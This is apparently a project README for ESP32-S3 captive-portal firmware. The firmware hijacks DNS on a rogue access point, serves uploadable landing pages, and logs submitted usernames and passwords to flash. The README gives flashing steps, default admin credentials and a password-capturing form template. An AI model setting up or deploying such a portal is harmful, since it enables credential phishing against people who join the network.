# ESP32-S3 Advanced Captive Portal Firmware

A self-contained, lightweight Captive Portal framework built for the **ESP32-S3** (optimized for the LilyGO T-Dongle-S3 and similar form-factors). This firmware establishes a local Wi-Fi Access Point, intercepts all DNS requests to force open a portal landing page, captures form data directly to the onboard `LittleFS` storage system, and provides a powerful, multi-tabbed web Administration Panel.

---

## Features

* **Zero-Configuration Captive Portal:** Fully handles DNS redirection (`*`) across Android, iOS/macOS, and Windows platform detection checks (`generate_204`, `fwlink`, `hotspot-detect.html`).
* **Dynamic Template Engine:** Upload multiple custom `.html` landing pages directly via the dashboard and swap the active template instantly without reflashing.
* **Persistent Credentials Logging:** Captures form inputs (`name` and `email`/`password`) straight to a text log file within the persistent `LittleFS` internal flash layer.
* **Multi-Tabbed Admin Dashboard:**
    * 📊 **Logs:** Live counter tracking total network traffic alongside a full inline plaintext editor to read, clear, or modify captured registrations.
    * ⚙️ **Network Settings:** Real-time metrics showing connected stations with inputs to dynamically shift the wireless SSID name and gateway IP address.
    * 🔒 **Access:** On-the-fly updates for the HTTP basic authentication administrative credentials.

---
## Hardware Variations Reference

This firmware targets the **With Screen** variant of the LilyGO T-Dongle-S3 board to facilitate low-level hardware initialization configurations, though the core web-app framework remains compatible across both form factors.
i got mine from aliexpress but the product came from spotpear https://spotpear.com/index/product/detail/id/1235.html

LilyGO T-Dongle-S3 Product Variations
<img width="800" height="800" alt="t-dongle-s3-07-en" src="https://github.com/user-attachments/assets/35990ca7-7fa0-442d-8800-060843ebd1d7" />

## Hardware Pinout Reference (T-Dongle-S3)

For tracking or modifying the hardware layout, the flash filesystem and standard peripheral configuration binds to the following GPIO registers:

| Peripheral / Interface | Pin Mapping |
| :--- | :--- |
| **TF Card Data 0 (SDMMC_D0)** | `IO14` |
| **Boot Button Switch** | `IO00` |
| **Onboard Screen Backlight (Active-LOW)** | `IO38` |
| **ST7735 LCD Data / Clock** | `IO03` (SDA) / `IO05` (SCL) |

---

## Repository Structure

```text
├── captive-portal-firmware.ino   # Core Arduino sketch compilation file
└── README.md                     # Documentation

```

---

## Installation & Setup

### 1. Prerequisites

Ensure you have the latest stable ESP32 core installed inside your Arduino IDE (**Tools -> Board -> Boards Manager -> search for `esp32**`).

### 2. Required Board Settings

When compiling for the ESP32-S3 USB Dongle form factor, match these parameters exactly under the **Tools** menu:

* **Board:** `ESP32S3 Dev Module`
* **USB CDC On Boot:** `Enabled` *(Crucial for serial terminal pass-through)*
* **Flash Size:** `16MB (128Mb)`
* **Partition Scheme:** `16M Flash (3MB APP/9.9MB FATFS)`
* **PSRAM:** `OPI PSRAM` (or `Disabled` if using non-PSRAM variants)

### 3. Deployment

1. Open `captive-portal-firmware.ino` in the Arduino IDE.
2. Select your device's active COM port.
3. Hit **Upload**.
4. If the module fails to auto-reset, hold the onboard physical `BOOT` button down while inserting the device into your USB port to clear the flash pipeline.

---

## Management Dashboard Guide

### Default Credentials

* **Wireless SSID Network:** `Your_WiFi_Setup`
* **Portal Admin Gateway URL:** `http://4.3.2.1/admin`
* **Username:** `admin`
* **Password:** `admin123`

### Custom Landing Page Implementation

To upload your own frontend design layouts, ensure your custom `.html` page forms utilize the correct naming parameters so the backend parser routes variables flawlessly:

```html
<form action="/submit" method="POST">
  <input type="text" name="name" placeholder="Enter Username" required>
  <input type="password" name="email" placeholder="Enter Password" required>
  
  <button type="submit">Submit Parameters</button>
</form>

```

---

## License

This architecture is distributed under the MIT License. Review the repository metadata for full liability stipulations.

```
